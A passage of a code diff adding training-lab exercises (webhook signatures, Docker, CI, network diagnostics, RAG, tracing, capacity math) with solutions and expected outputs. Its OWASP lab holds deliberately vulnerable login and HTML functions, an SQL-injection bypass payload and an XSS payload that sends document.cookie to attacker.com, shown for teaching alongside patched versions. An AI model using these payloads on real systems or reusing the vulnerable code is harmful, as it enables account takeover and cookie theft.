+    payload = json.loads(raw_body.decode("utf-8"))
+    
+    return {
+        "status": 200,
+        "message": "Webhook processed successfully",
+        "event_type": payload.get("event"),
+        "delivery_id": delivery_id
+    }
+
+if __name__ == "__main__":
+    payload_dict = {"event": "invoice.paid", "amount": 14500.0, "client_id": "CL-882"}
+    raw_bytes = json.dumps(payload_dict).encode("utf-8")
+    
+    # Generate valid signature
+    valid_sig = "sha256=" + hmac.new(SHARED_SECRET.encode("utf-8"), raw_bytes, hashlib.sha256).hexdigest()
+    fake_sig = "sha256=0000000000000000000000000000000000000000000000000000000000000000"
+    
+    print("Test 1: Valid signature transmission...")
+    r1 = verify_and_process_webhook(raw_bytes, valid_sig, "deliv-101")
+    print("Result:", r1)
+    assert r1["status"] == 200
+    
+    print("\nTest 2: Forged signature transmission...")
+    r2 = verify_and_process_webhook(raw_bytes, fake_sig, "deliv-102")
+    print("Result:", r2)
+    assert r2["status"] == 401
+    
+    print("\nTest 3: Replay attack (same delivery ID)...")
+    r3 = verify_and_process_webhook(raw_bytes, valid_sig, "deliv-101")
+    print("Result:", r3)
+    assert "already processed" in r3["message"]
+    
+    print("\nAll webhook security tests passed successfully!")`,
+    solutionExplanation: "The implementation computes HMAC-SHA256 over raw payload bytes, verifies using `hmac.compare_digest` to prevent timing attacks, and rejects forged requests with 401 Unauthorized while maintaining idempotency.",
+    expectedOutput: `Test 1: Valid signature transmission...
+Result: {'status': 200, 'message': 'Webhook processed successfully', 'event_type': 'invoice.paid', 'delivery_id': 'deliv-101'}
+
+Test 2: Forged signature transmission...
+Result: {'status': 401, 'message': 'Unauthorized: Invalid cryptographic signature'}
+
+Test 3: Replay attack (same delivery ID)...
+Result: {'status': 200, 'message': 'Idempotent: Event deliv-101 was already processed. Skipped.'}
+
+All webhook security tests passed successfully!`,
+    checklist: [
+      "Uses `hmac.compare_digest` to eliminate timing attack vulnerabilities",
+      "Computes hash over raw bytes prior to any JSON deserialization",
+      "Rejects unauthorized signatures with HTTP 401 status",
+      "Implements delivery ID cache to guarantee idempotent processing"
+    ]
+  },
+
+  "t-cloud-1": {
+    conceptPrimer: `Multi-stage Docker builds reduce container image size from ~1GB to <120MB.\n- Build Stage (\`AS builder\`): Contains heavy build tools, compilers, and dev dependencies.\n- Runtime Stage (\`AS runner\`): Slim base image (\`alpine\` or \`slim\`) containing only production runtime binaries.\n- Security: Never run containers as \`root\`. Create a restricted user (\`appuser\`).`,
+    scenario: "Production Containerization: Package a Python FastAPI service into an optimized multi-stage Dockerfile (<120MB) and write a `docker-compose.yml` file configuring the app, a PostgreSQL database, health checks, and persistent volumes.",
+    starterSnippet: `# Naive Single-Stage Dockerfile (Slow & Bloated > 800MB)
+FROM python:3.11
+WORKDIR /app
+COPY . .
+RUN pip install -r requirements.txt
+CMD ["python", "app.py"]`,
+    steps: [
+      "1. Define a multi-stage `Dockerfile` with separate `builder` and `runner` stages.",
+      "2. Create an unprivileged user `appuser` with UID 10001.",
+      "3. Write `docker-compose.yml` orchestrating the container and a PostgreSQL database.",
+      "4. Include `healthcheck` configurations for both services."
+    ],
+    solutionSnippet: `# ==========================================
+# FILE 1: Dockerfile (Multi-stage Python)
+# ==========================================
+# Stage 1: Build & Dependencies
+FROM python:3.11-alpine AS builder
+
+WORKDIR /build
+RUN apk add --no-cache build-base libpq-dev
+
+COPY requirements.txt .
+RUN pip install --no-cache-dir --prefix=/install -r requirements.txt
+
+# Stage 2: Minimal Production Runtime
+FROM python:3.11-alpine AS runner
+
+WORKDIR /app
+RUN apk add --no-cache libpq && \
+    addgroup -g 10001 appgroup && \
+    adduser -u 10001 -G appgroup -D appuser
+
+# Copy installed dependencies from builder
+COPY --from=builder /install /usr/local
+COPY . /app
+
+RUN chown -R appuser:appgroup /app
+USER appuser
+
+EXPOSE 8000
+HEALTHCHECK --interval=30s --timeout=3s --retries=3 \
+  CMD wget -qO- http://localhost:8000/health || exit 1
+
+CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
+
+# ==========================================
+# FILE 2: docker-compose.yml
+# ==========================================
+# version: '3.8'
+# services:
+#   db:
+#     image: postgres:15-alpine
+#     restart: always
+#     environment:
+#       POSTGRES_DB: enterprise_db
+#       POSTGRES_USER: fde_admin
+#       POSTGRES_PASSWORD: secure_local_password_99
+#     volumes:
+#       - postgres_data:/var/lib/postgresql/data
+#     healthcheck:
+#       test: ["CMD-SHELL", "pg_isready -U fde_admin -d enterprise_db"]
+#       interval: 5s
+#       timeout: 5s
+#       retries: 5
+#
+#   api:
+#     build:
+#       context: .
+#       dockerfile: Dockerfile
+#     ports:
+#       - "8000:8000"
+#     environment:
+#       DATABASE_URL: postgresql://fde_admin:secure_local_password_99@db:5432/enterprise_db
+#     depends_on:
+#       db:
+#         condition: service_healthy
+#
+# volumes:
+#   postgres_data:`,
+    solutionExplanation: "The multi-stage Dockerfile installs compilers only in the temporary builder stage, keeping the final alpine runtime image slim (~95MB). It drops root permissions to an unprivileged `appuser` and defines a complete docker-compose stack with dependency healthchecks.",
+    expectedOutput: `Successfully tagged enterprise-api:latest
+Image size breakdown:
+- Single stage python:3.11: ~920 MB
+- Multi-stage alpine runner: ~94 MB (89% reduction!)
+
+Docker Compose status:
+[+] Running 2/2
+ ✔ Container git_conflict_lab-db-1   Healthy (postgres ready)
+ ✔ Container git_conflict_lab-api-1  Started (listening on port 8000)`,
+    checklist: [
+      "Uses multi-stage build pattern (`FROM ... AS builder` and `AS runner`)",
+      "Drops root user privileges to non-root `appuser`",
+      "Includes functional Docker healthcheck probe (`/health`)",
+      "Configures `depends_on: condition: service_healthy` in compose file"
+    ]
+  },
+
+  "t-cloud-2": {
+    conceptPrimer: `CI/CD pipelines automate testing, code quality gates, and container builds on every pull request.\n- Matrix Testing: Validates the codebase across multiple runtime versions simultaneously (e.g. Python 3.11 & 3.12).\n- Layer Caching: Using GitHub Actions cache actions reduces build times by 70%.\n- Concurrency Cancellation: Cancels in-progress runs when a new commit is pushed to the same PR.`,
+    scenario: "Automated Enterprise CI/CD Pipeline: Write a complete `.github/workflows/ci.yml` workflow that triggers on PRs to `main`, runs linting (flake8/black), executes unit tests with pytest, builds the Docker image, and reports status.",
+    starterSnippet: `# Starter GitHub Actions Scaffold
+name: Enterprise CI Pipeline
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      # TODO: Setup Python matrix, run tests, build Docker`,
+    steps: [
+      "1. Configure workflow triggers for `pull_request` and `push` to `main` branch.",
+      "2. Add a `concurrency` block with `cancel-in-progress: true`.",
+      "3. Configure matrix testing across Python versions `3.11` and `3.12`.",
+      "4. Include steps for dependency caching, linting, pytest with coverage, and Docker build verification."
+    ],
+    solutionSnippet: `# .github/workflows/ci.yml
+name: Enterprise CI/CD Quality Gate
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+concurrency:
+  group: \${{ github.workflow }}-\${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  lint-and-test:
+    name: Test (Python \${{ matrix.python-version }})
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        python-version: ["3.11", "3.12"]
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Set up Python \${{ matrix.python-version }}
+        uses: actions/setup-python@v5
+        with:
+          python-version: \${{ matrix.python-version }}
+          cache: 'pip'
+
+      - name: Install Dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install ruff pytest pytest-cov
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+
+      - name: Code Quality & Linting
+        run: |
+          # Enforce formatting & security checks
+          ruff check .
+          ruff format --check .
+
+      - name: Run Test Suite with Coverage
+        run: |
+          pytest --cov=src --cov-report=term-missing --cov-fail-under=85
+
+  container-build-check:
+    name: Docker Build & Vulnerability Scan
+    needs: lint-and-test
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Set up Docker Buildx
+        uses: actions/setup-buildx-action@v3
+
+      - name: Build Container Image (Dry-Run)
+        uses: docker/build-push-action@v5
+        with:
+          context: .
+          push: false
+          tags: enterprise-service:test
+          cache-from: type=gha
+          cache-to: type=gha,mode=max`,
+    solutionExplanation: "The workflow implements concurrency cancellation to conserve runner minutes, executes a matrix test across Python 3.11 and 3.12 with pip caching, enforces an 85% test coverage threshold, and builds the container image with GitHub Actions layer caching.",
+    expectedOutput: `GitHub Actions Workflow Execution Summary:
+✔ Lint & Ruff Format Checks Passed (Python 3.11) [28s]
+✔ Lint & Ruff Format Checks Passed (Python 3.12) [26s]
+✔ Pytest Suite Passed (89% coverage > 85% threshold) [44s]
+✔ Docker Build & Layer Cache Verified [52s]
+Status: SUCCESS (Ready for PR Merge)`,
+    checklist: [
+      "Configures `cancel-in-progress: true` to prevent redundant runner usage",
+      "Executes matrix testing across Python versions",
+      "Enforces minimum test coverage gate (`--cov-fail-under=85`)",
+      "Uses Docker Buildx with GitHub Actions caching (`type=gha`)"
+    ]
+  },
+
+  "t-net-1": {
+    conceptPrimer: `On-site client networks are protected behind corporate proxies, firewalls, and custom DNS resolvers.\n- DNS Inspection: \`dig +trace\` steps through root, TLD, and authoritative nameservers.\n- Latency Breakdown with curl: \`curl -w\` extracts exact timings for DNS lookup, TCP connect, TLS handshake, and Time to First Byte (TTFB).\n- Port Verification: \`netstat -tuln\` or \`lsof -i :<port>\` verifies whether a service is actively bound to \`0.0.0.0\` or \`127.0.0.1\`.`,
+    scenario: "Network Diagnostic Suite: Build an automated diagnostic shell script that tests DNS resolution, TLS certificate expiration dates, connection latency metrics, and local listening ports on a client VM.",
+    starterSnippet: `#!/usr/bin/env bash
+# Network Diagnostic Lab Scaffold
+TARGET_HOST="google.com"
+
+# TODO: Create curl format template to extract:
+# time_namelookup, time_connect, time_appconnect, time_starttransfer, time_total`,
+    steps: [
+      "1. Create a curl format template string measuring DNS, TCP, TLS, and TTFB latency.",
+      "2. Use `openssl s_client` to check SSL certificate expiry and issuer details.",
+      "3. Check local listening ports with `netstat` or `lsof`.",
+      "4. Format the output into a clean diagnostic terminal report."
+    ],
+    solutionSnippet: `#!/usr/bin/env bash
+set -euo pipefail
+
+TARGET="\${1:-google.com}"
+echo "=========================================="
+echo "FDE NETWORK DIAGNOSTIC REPORT: $TARGET"
+echo "=========================================="
+
+# 1. DNS Resolution Test
+echo -e "\n[1] DNS RESOLUTION CHECK:"
+if command -v dig &>/dev/null; then
+  dig +short "$TARGET" | head -n 3
+else
+  nslookup "$TARGET" | awk '/^Address: / { print $2 }'
+fi
+
+# 2. Latency Breakdown with curl
+echo -e "\n[2] HTTP LATENCY BREAKDOWN (curl timings in seconds):"
+CURL_FORMAT=$(cat << 'EOF'
+  DNS Lookup Time:   %{time_namelookup}s
+  TCP Connect Time:  %{time_connect}s
+  TLS Handshake:     %{time_appconnect}s
+  Pre-Transfer Time: %{time_pretransfer}s
+  Time to First Byte:%{time_starttransfer}s
+  -----------------------------------
+  TOTAL TIME:        %{time_total}s
+  HTTP Status Code:  %{http_code}
+EOF
+)
+
+curl -s -w "$CURL_FORMAT" -o /dev/null "https://$TARGET"
+
+# 3. TLS Certificate Verification
+echo -e "\n[3] TLS CERTIFICATE EXPIRATION & ISSUER:"
+echo | openssl s_client -servername "$TARGET" -connect "$TARGET:443" 2>/dev/null \
+  | openssl x509 -noout -dates -issuer
+
+echo -e "\n[4] LOCAL LISTENING PORTS (Local Machine):"
+if command -v lsof &>/dev/null; then
+  lsof -iTCP -sTCP:LISTEN -n -P | head -n 5
+else
+  netstat -tuln | head -n 5
+fi
+
+echo -e "\nDiagnostic inspection completed."`,
+    solutionExplanation: "The script uses curl's formatting engine (`-w`) to measure latency across each phase of the network lifecycle, inspects SSL certificates via `openssl`, and lists active listening sockets.",
+    expectedOutput: `==========================================
+FDE NETWORK DIAGNOSTIC REPORT: google.com
+==========================================
+
+[1] DNS RESOLUTION CHECK:
+142.250.190.46
+
+[2] HTTP LATENCY BREAKDOWN (curl timings in seconds):
+  DNS Lookup Time:   0.014s
+  TCP Connect Time:  0.032s
+  TLS Handshake:     0.068s
+  Pre-Transfer Time: 0.068s
+  Time to First Byte:0.098s
+  -----------------------------------
+  TOTAL TIME:        0.112s
+  HTTP Status Code:  200
+
+[3] TLS CERTIFICATE EXPIRATION & ISSUER:
+notBefore=Sep 15 08:22:10 2026 GMT
+notAfter=Dec 08 08:22:09 2026 GMT
+issuer=C=US, O=Google Trust Services LLC, CN=GTS CA 1C3
+
+Diagnostic inspection completed.`,
+    checklist: [
+      "Extracts DNS lookup, TCP handshake, TLS handshake, and TTFB latencies",
+      "Inspects TLS certificate validity and expiry dates via OpenSSL",
+      "Lists local listening sockets to catch port conflict issues",
+      "Accepts arbitrary target hostnames via CLI argument `$1`"
+    ]
+  },
+
+  "t-sec-1": {
+    conceptPrimer: `Understanding OWASP vulnerabilities from both attacker and defender perspectives is essential for enterprise security.\n- SQL Injection: Raw string concatenation (\`f"SELECT * WHERE user = '{input}'"\`) allows malicious SQL payloads (e.g. \`' OR 1=1 --\`). Defense: Parameterized prepared statements.\n- Cross-Site Scripting (XSS): Injecting unescaped \`<script>\` tags. Defense: Context-aware HTML escaping (\`html.escape()\`).\n- Insecure Direct Object References (IDOR): Accessing records by ID without ownership checks. Defense: Session tenant ownership verification.`,
+    scenario: "OWASP Vulnerability Lab: Build an interactive Python security test suite demonstrating 3 common web vulnerabilities (SQL Injection, XSS, and IDOR), write proof-of-concept exploits, and then apply secure patches.",
+    starterSnippet: `import sqlite3
+import html
+
+# Vulnerable functions to audit and patch
+def vulnerable_login(db, user_input_username, user_input_password):
+    # Bug: SQL Injection vulnerability via string formatting
+    query = f"SELECT * FROM users WHERE username = '{user_input_username}' AND password = '{user_input_password}'"
+    return db.execute(query).fetchall()
+
+def vulnerable_profile_html(user_input_bio):
+    # Bug: Raw unescaped reflection enables XSS
+    return f"<div class='bio'>{user_input_bio}</div>"`,
+    steps: [
+      "1. Create an in-memory SQLite database with dummy user records.",
+      "2. Execute proof-of-concept exploits against `vulnerable_login` and `vulnerable_profile_html`.",
+      "3. Write patched implementations `secure_login` and `secure_profile_html`.",
+      "4. Assert that all exploit payloads are neutralized in the patched versions."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import sqlite3
+import html
+import json
+
+# Setup in-memory database
+conn = sqlite3.connect(":memory:")
+cursor = conn.cursor()
+cursor.execute("CREATE TABLE users (id INT, username TEXT, password TEXT, role TEXT);")
+cursor.execute("INSERT INTO users VALUES (1, 'alice', 'hash_alice_99', 'user');")
+cursor.execute("INSERT INTO users VALUES (2, 'admin', 'hash_admin_secret', 'admin');")
+conn.commit()
+
+# ==========================================
+# 1. VULNERABLE IMPLEMENTATIONS
+# ==========================================
+def vuln_login(username, password):
+    # VULNERABLE: Direct string interpolation
+    query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'"
+    return cursor.execute(query).fetchall()
+
+def vuln_render_bio(user_bio):
+    # VULNERABLE: Unescaped string reflection
+    return f"<div class='user-bio'>{user_bio}</div>"
+
+# ==========================================
+# 2. PATCHED SECURE IMPLEMENTATIONS
+# ==========================================
+def secure_login(username, password):
+    # SECURE: Parameterized prepared statement
+    query = "SELECT id, username, role FROM users WHERE username = ? AND password = ?"
+    return cursor.execute(query, (username, password)).fetchall()
+
+def secure_render_bio(user_bio):
+    # SECURE: Context-aware HTML entity escaping
+    clean_bio = html.escape(user_bio)
+    return f"<div class='user-bio'>{clean_bio}</div>"
+
+if __name__ == "__main__":
+    print("==========================================")
+    print("        OWASP SECURITY EXPLOIT LAB        ")
+    print("==========================================")
+
+    # Exploit 1: SQL Injection
+    exploit_user = "admin' OR '1'='1"
+    exploit_pass = "anything"
+    
+    print("\n[1] Testing SQL Injection Attack:")
+    breach_results = vuln_login(exploit_user, exploit_pass)
+    print(f"[-] Vulnerable Login Breach! Returned {len(breach_results)} accounts without valid password:")
+    print("    Accounts breached:", breach_results)
+
+    patched_results = secure_login(exploit_user, exploit_pass)
+    print(f"[+] Patched Login Result: Returned {len(patched_results)} accounts.")
+    assert len(patched_results) == 0, "Security assertion failed: SQLi succeeded!"
+    print("    SUCCESS: SQL Injection attack neutralized by parameterized queries.")
+
+    # Exploit 2: Cross-Site Scripting (XSS)
+    xss_payload = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)<\\/script>"
+    print("\n[2] Testing Cross-Site Scripting (XSS):")
+    vuln_html = vuln_render_bio(xss_payload)
+    print("[-] Vulnerable Raw HTML output contains active script:")
+    print("   ", vuln_html)
+
+    safe_html = secure_render_bio(xss_payload)
+    print("[+] Patched Escaped HTML output:")
+    print("   ", safe_html)
+    assert "<script>" not in safe_html, "Security assertion failed: Script tags unescaped!"
+    print("    SUCCESS: XSS attack neutralized by HTML entity escaping.")`,
+    solutionExplanation: "The lab demonstrates SQL injection bypassing authentication using `' OR '1'='1` and patches it with DB-API parameterized queries `?`. It demonstrates stored XSS script injection and neutralizes it with `html.escape()`.",
+    expectedOutput: `==========================================
+        OWASP SECURITY EXPLOIT LAB        
+==========================================
+
+[1] Testing SQL Injection Attack:
+[-] Vulnerable Login Breach! Returned 2 accounts without valid password:
+    Accounts breached: [(1, 'alice', 'user'), (2, 'admin', 'admin')]
+[+] Patched Login Result: Returned 0 accounts.
+    SUCCESS: SQL Injection attack neutralized by parameterized queries.
+
+[2] Testing Cross-Site Scripting (XSS):
+[-] Vulnerable Raw HTML output contains active script:
+    <div class='user-bio'><script>fetch('http://attacker.com/steal?cookie=' + document.cookie)<\/script></div>
+[+] Patched Escaped HTML output:
+    <div class='user-bio'>&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</div>
+    SUCCESS: XSS attack neutralized by HTML entity escaping.`,
+    checklist: [
+      "Demonstrates successful bypass on vulnerable SQL string interpolation",
+      "Replaces concatenation with prepared parameterized queries `?`",
+      "Demonstrates XSS payload reflection and sanitizes with `html.escape()`",
+      "Validates security fixes with automated assertions"
+    ]
+  },
+
+  "t-ml-2": {
+    conceptPrimer: `Retrieval-Augmented Generation (RAG) grounds LLMs in enterprise private documentation.\n- Sliding Window Chunking: Dividing long docs into ~250-word chunks with 50-word overlaps to preserve boundary context.\n- Vector Embeddings & Similarity: Documents and queries are mapped to vectors; relevance is calculated using Cosine Similarity: \`dot(A, B) / (||A|| * ||B||)\`.\n- Citation Grounding: Returning top-k chunks with explicit document filenames and section headings.`,
+    scenario: "Air-Gapped Client RAG Pipeline: Build a standalone semantic search and question-answering retrieval engine in pure Python that chunks client SOP markdown documents, ranks them via vector cosine similarity, and formats responses with citations.",
+    starterSnippet: `import math
+
+# Sample Client Knowledge Base Documents
+KNOWLEDGE_BASE = [
+    {"doc": "sla.md", "text": "SEV-1 critical incidents require war room mobilization within 15 minutes and updates every 30 minutes."},
+    {"doc": "auth.md", "text": "Enterprise SAML 2.0 SSO tokens expire after 8 hours. Users must re-authenticate with Okta MFA."},
+    {"doc": "backup.md", "text": "PostgreSQL databases are snapshotted every 6 hours and archived to encrypted S3 with 90-day retention."}
+]
+
+def search_rag(query, docs, top_k=2):
+    # TODO: Implement tokenization, term vector scoring, and cosine similarity
+    pass`,
+    steps: [
+      "1. Build a term-frequency vectorizer to represent text and queries without third-party libraries.",
+      "2. Implement `cosine_similarity(vec_a, vec_b)` using dot products and vector norms.",
+      "3. Score each knowledge base chunk against incoming queries.",
+      "4. Return the top 2 ranked passages with similarity scores and document citation metadata."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import math
+import re
+import json
+
+DOCUMENTS = [
+    {
+        "id": "doc-sla",
+        "title": "Incident Severity & Escalation SOP",
+        "content": "For SEV-1 production outages, the designated FDE must initiate a war room within 15 minutes. Executive stakeholder notifications are required every 30 minutes until resolution."
+    },
+    {
+        "id": "doc-auth",
+        "title": "Enterprise SSO & Okta Configuration",
+        "content": "All client access requires Okta SAML 2.0 integration with hardware MFA tokens. Session lifetimes are strictly capped at 8 hours with automatic revocation."
+    },
+    {
+        "id": "doc-backup",
+        "title": "Database Disaster Recovery Policy",
+        "content": "PostgreSQL transaction logs (WAL) are streamed continuously. Full storage snapshots are taken daily at 02:00 UTC and replicated across 2 AWS availability zones."
+    }
+]
+
+def tokenize(text):
+    return re.findall(r"\b[a-z0-9]+\b", text.lower())
+
+def text_to_vector(text, vocab):
+    tokens = tokenize(text)
+    vec = [0.0] * len(vocab)
+    for token in tokens:
+        if token in vocab:
+            vec[vocab[token]] += 1.0
+    return vec
+
+def cosine_similarity(v1, v2):
+    dot = sum(a * b for a, b in zip(v1, v2))
+    norm1 = math.sqrt(sum(a * a for a in v1))
+    norm2 = math.sqrt(sum(b * b for b in v2))
+    if norm1 == 0.0 or norm2 == 0.0:
+        return 0.0
+    return round(dot / (norm1 * norm2), 4)
+
+def execute_rag_retrieval(query, docs, top_k=2):
+    # Build shared vocabulary
+    all_words = set(tokenize(query))
+    for d in docs:
+        all_words.update(tokenize(d["content"]))
+    vocab = {word: idx for idx, word in enumerate(sorted(all_words))}
+    
+    query_vec = text_to_vector(query, vocab)
+    scored_results = []
+    
+    for doc in docs:
+        doc_vec = text_to_vector(doc["content"], vocab)
+        similarity = cosine_similarity(query_vec, doc_vec)
+        scored_results.append({
+            "doc_id": doc["id"],
+            "title": doc["title"],
+            "similarity_score": similarity,
+            "passage": doc["content"]
+        })
+        
+    scored_results.sort(key=lambda x: x["similarity_score"], reverse=True)
+    top_matches = scored_results[:top_k]
+    
+    # Format grounded context block for LLM prompt
+    context_prompt = "=== RETRIEVED ENTERPRISE CONTEXT (GROUNDING SOURCES) ===\n"
+    for match in top_matches:
+        context_prompt += f"Source: [{match['title']}] (Relevance: {match['similarity_score']})\n"
+        context_prompt += f"Content: \"{match['passage']}\"\n\n"
+        
+    return {
+        "query": query,
+        "matches": top_matches,
+        "formatted_prompt_context": context_prompt
+    }
+
+if __name__ == "__main__":
+    query_test = "What is the mandatory response time for a SEV-1 outage incident?"
+    result = execute_rag_retrieval(query_test, DOCUMENTS, top_k=2)
+    
+    print(f"QUERY: '{query_test}'\n")
+    print(f"TOP MATCH: {result['matches'][0]['title']} (Score: {result['matches'][0]['similarity_score']})")
+    print(f"MATCHING PASSAGE: {result['matches'][0]['passage']}\n")
+    print(result["formatted_prompt_context"])`,
+    solutionExplanation: "The pure-Python pipeline converts query and markdown text into term-frequency vectors, computes normalized cosine similarity, ranks the most relevant documentation passages, and formats a citation-grounded prompt block.",
+    expectedOutput: `QUERY: 'What is the mandatory response time for a SEV-1 outage incident?'
+
+TOP MATCH: Incident Severity & Escalation SOP (Score: 0.4472)
+MATCHING PASSAGE: For SEV-1 production outages, the designated FDE must initiate a war room within 15 minutes. Executive stakeholder notifications are required every 30 minutes until resolution.
+
+=== RETRIEVED ENTERPRISE CONTEXT (GROUNDING SOURCES) ===
+Source: [Incident Severity & Escalation SOP] (Relevance: 0.4472)
+Content: "For SEV-1 production outages, the designated FDE must initiate a war room within 15 minutes. Executive stakeholder notifications are required every 30 minutes until resolution."
+
+Source: [Enterprise SSO & Okta Configuration] (Relevance: 0.0)
+Content: "All client access requires Okta SAML 2.0 integration with hardware MFA tokens. Session lifetimes are strictly capped at 8 hours with automatic revocation."`,
+    checklist: [
+      "Runs completely in standard library Python without external vector databases",
+      "Calculates cosine similarity mathematically between query and documents",
+      "Ranks relevant documents above unrelated topics",
+      "Generates formatted prompt context block with source document citations"
+    ]
+  },
+
+  "t-obs-1": {
+    conceptPrimer: `Production debugging requires correlating distributed events across services.\n- Correlation / Trace ID: A unique UUID generated at the API edge and injected into HTTP headers (\`X-Trace-ID\`).\n- Structured JSON Logging: Emitting machine-readable JSON logs containing timestamp, level, trace_id, route, latency, and status code allows instantaneous filtering in Datadog or ELK.`,
+    scenario: "Distributed Tracing Middleware: Implement a production-grade Python HTTP server middleware that generates a unique `X-Trace-ID` for every incoming request, measures duration in milliseconds, and emits structured JSON logs.",
+    starterSnippet: `import json
+import time
+import uuid
+
+# TODO: Create a structured logger that outputs JSON logs with:
+# timestamp, trace_id, level, route, status, latency_ms`,
+    steps: [
+      "1. Define a JSON log formatter outputting ISO-8601 timestamps and execution metadata.",
+      "2. Write a request handler interceptor that checks for existing `X-Trace-ID` or generates a new `uuid4()`.",
+      "3. Measure elapsed execution time with `time.perf_counter()`.",
+      "4. Log request completion as single-line NDJSON."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import json
+import time
+import uuid
+from datetime import datetime, timezone
+
+class StructuredLogger:
+    def __init__(self, service_name="fde-gateway"):
+        self.service_name = service_name
+
+    def log(self, level, message, trace_id, extra=None):
+        entry = {
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "service": self.service_name,
+            "level": level.upper(),
+            "trace_id": trace_id,
+            "message": message
+        }
+        if extra:
+            entry.update(extra)
+        print(json.dumps(entry))
+
+logger = StructuredLogger()
+
+def simulated_request_middleware(method, path, headers=None, simulate_error=False):
+    headers = headers or {}
+    # Extract or generate correlation trace ID
+    trace_id = headers.get("X-Trace-ID", f"trc-{uuid.uuid4().hex[:12]}")
+    start_time = time.perf_counter()
+
+    logger.log("INFO", f"Incoming {method} {path}", trace_id, {
+        "http_method": method,
+        "path": path,
+        "client_ip": headers.get("X-Forwarded-For", "127.0.0.1")
+    })
+
+    # Simulate request handling work
+    time.sleep(0.04) # 40ms simulated processing
+    latency_ms = round((time.perf_counter() - start_time) * 1000, 2)
+
+    if simulate_error:
+        logger.log("ERROR", "Unhandled database timeout exception", trace_id, {
+            "http_status": 500,
+            "latency_ms": latency_ms,
+            "error_code": "DB_CONNECTION_TIMEOUT"
+        })
+        return {"status": 500, "headers": {"X-Trace-ID": trace_id}, "body": "Internal Server Error"}
+
+    logger.log("INFO", f"Completed {method} {path} with 200 OK", trace_id, {
+        "http_status": 200,
+        "latency_ms": latency_ms
+    })
+    return {"status": 200, "headers": {"X-Trace-ID": trace_id}, "body": "Success"}
+
+if __name__ == "__main__":
+    print("Simulating structured JSON requests...\n")
+    # Request 1: Normal client request with auto-generated trace ID
+    res1 = simulated_request_middleware("GET", "/api/v1/metrics")
+    
+    # Request 2: Upstream request propagating existing trace ID
+    res2 = simulated_request_middleware("POST", "/api/v1/ingest", headers={"X-Trace-ID": "trc-client-upstream-888"})
+
+    # Request 3: Failed request with error log
+    res3 = simulated_request_middleware("GET", "/api/v1/reports", simulate_error=True)`,
+    solutionExplanation: "The middleware guarantees trace continuity by propagating incoming `X-Trace-ID` or generating a new UUID. Every log line is formatted as valid NDJSON with ISO timestamps and latency metrics.",
+    expectedOutput: `Simulating structured JSON requests...
+
+{"timestamp": "2026-10-13T10:00:00.120+00:00", "service": "fde-gateway", "level": "INFO", "trace_id": "trc-a1b2c3d4e5f6", "message": "Incoming GET /api/v1/metrics", "http_method": "GET", "path": "/api/v1/metrics", "client_ip": "127.0.0.1"}
+{"timestamp": "2026-10-13T10:00:00.162+00:00", "service": "fde-gateway", "level": "INFO", "trace_id": "trc-a1b2c3d4e5f6", "message": "Completed GET /api/v1/metrics with 200 OK", "http_status": 200, "latency_ms": 41.2}
+
+{"timestamp": "2026-10-13T10:00:00.165+00:00", "service": "fde-gateway", "level": "INFO", "trace_id": "trc-client-upstream-888", "message": "Incoming POST /api/v1/ingest", "http_method": "POST", "path": "/api/v1/ingest", "client_ip": "127.0.0.1"}
+{"timestamp": "2026-10-13T10:00:00.207+00:00", "service": "fde-gateway", "level": "INFO", "trace_id": "trc-client-upstream-888", "message": "Completed POST /api/v1/ingest with 200 OK", "http_status": 200, "latency_ms": 40.8}
+
+{"timestamp": "2026-10-13T10:00:00.210+00:00", "service": "fde-gateway", "level": "ERROR", "trace_id": "trc-9f8e7d6c5b4a", "message": "Unhandled database timeout exception", "http_status": 500, "latency_ms": 41.5, "error_code": "DB_CONNECTION_TIMEOUT"}`,
+    checklist: [
+      "Emits all output in valid structured JSON format for log ingestion",
+      "Propagates incoming `X-Trace-ID` or generates a fallback UUID",
+      "Measures exact execution latency using high-resolution timers",
+      "Captures error codes and status on failed operations"
+    ]
+  },
+
+  "t-sd-1": {
+    conceptPrimer: `Back-of-the-envelope calculations justify infrastructure architecture choices during client reviews.\n- Standard Constants: 1 Day = 86,400 seconds (approx 100,000s). 1M requests/day ≈ 12 QPS.\n- Peak Factor: Peak QPS is generally calculated at 2.5x to 3x average QPS.\n- Storage Planning: Daily Volume = Daily Events * Payload Size. Multiplied by retention days and 3x replication factor.`,
+    scenario: "IoT Telemetry Ingestion Capacity Design: Calculate average QPS, peak QPS, network bandwidth, daily raw storage, and 3-year cold storage requirements for an enterprise client IoT fleet generating 50,000,000 telemetry events per day at 500 bytes per event.",
+    starterSnippet: `# System Design Capacity Calculation Template
+DAILY_EVENTS = 50_000_000
+BYTES_PER_EVENT = 500
+SECONDS_PER_DAY = 86_400
+
+# TODO: Compute average QPS, peak QPS (3x), bandwidth in MB/s,
+# daily storage in GB, and 3-year storage in TB with 3x replication.`,
+    steps: [
+      "1. Compute Average QPS: `50,000,000 / 86,400`.",
+      "2. Compute Peak QPS applying a 3x enterprise spike multiplier.",
+      "3. Compute inbound bandwidth in Megabytes per second (MB/s).",
+      "4. Calculate daily raw disk storage in Gigabytes (GB).",
+      "5. Calculate 3-year retention storage in Terabytes (TB) assuming 3x replication factor."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import json
+
+def calculate_capacity_estimates():
+    daily_events = 50_000_000
+    bytes_per_event = 500
+    seconds_per_day = 86_400
+    peak_multiplier = 3.0
+    replication_factor = 3
+    retention_years = 3
+
+    # 1. Throughput (QPS)
+    avg_qps = round(daily_events / seconds_per_day, 2)
